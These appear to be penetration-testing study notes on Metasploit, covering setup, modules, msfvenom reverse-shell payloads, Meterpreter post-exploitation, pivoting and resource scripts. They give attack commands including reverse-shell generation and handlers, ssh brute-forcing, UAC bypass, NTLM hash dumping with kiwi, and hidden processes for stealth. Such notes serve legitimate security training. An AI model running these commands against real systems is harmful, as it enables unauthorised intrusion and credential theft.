<h3 id="the-basics">The Basics</h3>
<p><strong>Setup and Navigate Metasploit</strong></p>
<ul>
<li>Database isn&#39;t enabled by default<ul>
<li><code>sudo msfdb init</code>, <code>sudo systemctl enable postgresql</code><ul>
<li>To restart database, stop postgresql and then <code>sudo msfdb reinit</code></li>
</ul>
</li>
<li>Run <code>db_status</code> in the console to check</li>
</ul>
</li>
<li>Workspaces<ul>
<li><code>workspace</code> - create workspaces when pentesting a client </li>
<li><code>db_nmap</code> - works like regular nmap, but stores results in the db<ul>
<li>Query db with <code>hosts</code> for hosts and <code>services</code> for services</li>
</ul>
</li>
</ul>
</li>
<li><code>show -h</code> to show all modules, like <code>exploits</code>, <code>payloads</code>, and <code>auxiliary</code><ul>
<li>Showing payloads is nice; default is usually reverse tcp shell
<strong>Auxiliary Modules</strong></li>
</ul>
</li>
<li>Used for external attacks, like enumeration, scanning, fuzzing, sniffing, etc.</li>
<li><code>search</code> to search through the modules, with <code>type</code> to specify the module type<ul>
<li>For example: <code>search type:auxiliary smb</code> or <code>search Apache 2.4.41</code></li>
<li>When some exploits have multiple targets, and you have a m</li>
</ul>
</li>
<li><code>use</code> to use a module with a given index from a search<ul>
<li>For example: <code>use /auxiliary/scanner/ssh/ssh_login</code> to brute force ssh</li>
</ul>
</li>
<li><code>info</code> to get information about the current module</li>
<li><code>show options</code> to give options that the module can use</li>
<li><code>set {option} {parameter}</code> to set an option to a given parameter, like RHOSTS to an IP<ul>
<li><code>unset</code> to unset</li>
<li>can set files by providing the path</li>
<li>can set payloads by providing the path (<code>/payload/linux/x86/shell_reverse_tcp</code>)</li>
</ul>
</li>
<li><code>vulns</code> to see if any vulnerabilities have been automatically detected</li>
<li><code>creds</code> to show any discovered creds</li>
<li><code>run -j</code> to run a job in the background and create a session for one client</li>
<li><code>sessions</code> can switch between shells<ul>
<li>Use CTRL+Z to exit a shell but keep it in the background</li>
<li><code>sessions -l</code> to list available sessions</li>
<li><code>sessions -i {session_number}</code> to switch (interact) with a session<h3 id="using-payloads">Using Payloads</h3>
<strong>Staged/Non-Stated Payloads</strong></li>
</ul>
</li>
<li>Non-staged: payload is sent along with the exploit<ul>
<li>No use of <code>/</code>  means that it&#39;s non-staged (e.g. <code>shell_reverse_tcp</code>)</li>
</ul>
</li>
<li>Staged: Exploit the machine for a callback, then give a larger payload<ul>
<li><code>/</code> indicates a staged payload (e.g. <code>shell/reverse_tcp</code>)</li>
</ul>
</li>
<li><code>show payloads</code> to see a list of all payloads<ul>
<li><code>set payload {index}</code> to set a payload after showing them
<strong>Meterpreter</strong></li>
</ul>
</li>
<li>Multi-function payload residing entirely in memory</li>
<li><code>help</code> to display commands in shell</li>
<li><code>sysinfo</code>  and <code>getuid</code> to gather system data</li>
<li>put <code>l</code> before any command to run it on kali</li>
<li>Channels:<ul>
<li>Basically the same thing as <code>sessions</code> in msf</li>
<li><code>shell</code> and Ctrl+Z to push a channel to the background</li>
<li><code>channel -l</code> to list all channels</li>
<li><code>channel -i 1</code> to interact with a channel</li>
</ul>
</li>
<li><code>download {file_path}</code> to download a file from the system</li>
<li><code>upload {local_file_path} {resulting_file_path}</code> to upload a file to the system</li>
<li><code>search -f {filename}</code> to search from <code>/</code> for a file named <code>{filename}</code>
<strong>Executable Payloads</strong></li>
<li><code>msfvenom</code> can generate malicious executables</li>
<li><code>msfvenom -l payloads --platform {os (windows)} --arch {arch (x86)}</code> to list payloads</li>
<li><code>msfvenom -p {path_to_payload} LHOST={IP} LPORT={kali_listening_port} -f {filetype (exe)} -o {output_executable}</code> to generate an executable</li>
<li>To get an interactive shell via a staged payload, we can use Metasploit&#39;s <em>multi/handler</em><ul>
<li><code>use multi/handler</code></li>
<li>Staged payloads will now give us an interactive shell</li>
</ul>
</li>
<li>Steps:<ul>
<li><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f c</code><ul>
<li>We only get one meterpreter shell, so consider these instead:<ul>
<li><code>windows/x64/shell_reverse_tcp</code></li>
<li><code>linux/x64/shell_reverse_tcp</code></li>
</ul>
</li>
</ul>
</li>
<li><code>msfconsole</code></li>
<li><code>use exploit/multi/handler</code></li>
<li><code>set payload linux/x86/meterpreter/reverse_tcp</code></li>
<li><code>set LHOST 10.0.0.1</code></li>
<li><code>set LPORT 4444</code></li>
<li><code>exploit -j</code><h3 id="post-exploitation">Post-Exploitation</h3>
<strong>Meterpreter Post-Exploitation Features</strong></li>
</ul>
</li>
<li><code>idletime</code> to see how long it&#39;s been since the system was used (e.g. don&#39;t run shit until empty)</li>
<li><code>getsystem</code> to attempt to elevate privileges to NT AUTHORITY\SYSTEM</li>
<li><code>migrate {process_id}</code> - injects meterpreter into another process for stealth and persistence<ul>
<li>If no good processes exist, create one with <code>execute -H -f {process (notepad)}</code><ul>
<li><code>-H</code> hides the process, so no visual representation will be present
<strong>Post-Exploitation Modules</strong></li>
</ul>
</li>
</ul>
</li>
<li>After injecting ourselves into another process, our privilege level drops, so we need to escalate</li>
<li><code>exploit/windows/local/bypassuac_sdclt</code> is good for UAC bypassing on Windows<ul>
<li>We can set our session to the session running the shell (from Ctrl+Z -&gt; <code>bg</code>)</li>
</ul>
</li>
<li>Can load extensions directly inside the active session using <code>load</code><ul>
<li><code>load kiwi</code> to load an extension equivalent to Mimikatz</li>
<li><code>help</code> to view commands, like <code>creds_msv</code> to dump NTLM hashes</li>
</ul>
</li>
<li>Can search for post exploitation modules with <code>search post ...</code><ul>
<li>These only require a meterpreter session id
<strong>Pivoting with Metasploit</strong></li>
</ul>
</li>
<li>After getting on a machine, we can enumerate the network in a number of ways</li>
<li>If we find an internal IP from something like <code>ipconfig</code>, we can pivot to it with the following:<ul>
<li><code>bg</code> to background the session in meterpreter and <code>route add {IP.IP.IP.0/24} {session_number}</code> to add a route to an internal network reachable through a compromised host<ul>
<li>We can remove old routes with <code>route flush</code></li>
</ul>
</li>
<li>We can then set RHOSTS to an internal IP and use something like <code>auxiliary/scanner/portscan/tcp</code> to scan the open ports on the internal IP</li>
<li>Running exploits is the exact same--it just required the route set up in Metasploit</li>
</ul>
</li>
<li>Can also use <code>autoroute</code> module to set up pivot routes<ul>
<li><code>use multi/manage/autoroute</code></li>
<li><code>set session {session_ID}</code> - can list all sessions with <code>sessions -l</code></li>
</ul>
</li>
<li>Can also combine routes with <code>server/socks_proxy</code><ul>
<li><code>use auxiliary/server/socks_proxy</code></li>
<li>Then set <code>VERSION</code>, <code>SRVHOST</code> as localhost, and <code>run -j</code><ul>
<li>This will probably return the port 1080</li>
</ul>
</li>
<li>Then add <code>socks5 127.0.0.1 1080</code> to <code>/etc/proxychains4.conf</code></li>
<li>Can then use proxychains to run commands, such as <code>xfreerdp</code><ul>
<li><code>sudo proxychains xfreerdp /v:{internal_target_IP} /u:luiza</code></li>
</ul>
</li>
</ul>
</li>
<li>Can also use <code>portfwd</code><ul>
<li>Use a meterpreter session with <code>sessions -i {session #}</code></li>
<li>Then, port forward with <code>portfwd add -l {local_port} -p {remote_port} -r {int_IP}</code></li>
</ul>
</li>
</ul>
<h3 id="automation">Automation</h3>
<p><strong>Resource Scripts</strong></p>
<ul>
<li>Can chain together metasploit commands and Ruby code<ul>
<li>Put all commands in a script (.rc) and pass it to msfconsole with <code>-r</code></li>
<li>Can configure AutoRunScript to automatically execute a module after the script has been run - <code>set AutoRunScript {module (/post/windows/manage/migrate)}</code></li>
<li><code>set ExitOnSession</code> to false to keep the multi/handler listening after a connection</li>
<li>Then, run with <code>-z</code> and <code>-j</code> to put the job in the background and stop us from interacting</li>
</ul>
</li>
<li>Prebuilt available at <code>/usr/share/metasploit-framework/scripts/resource</code></li>
</ul>
